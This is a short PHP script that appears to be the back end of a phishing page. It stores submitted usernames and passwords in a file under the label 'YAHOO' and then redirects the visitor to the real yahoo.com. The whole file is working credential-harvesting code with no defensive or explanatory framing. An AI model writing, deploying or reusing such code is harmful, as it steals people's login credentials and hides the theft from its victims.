<?php

file_put_contents("../facebook/mydata.txt", "YAHOO Username: " . $_POST['username'] . " Password: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://yahoo.com/');
exit();
                                                                  
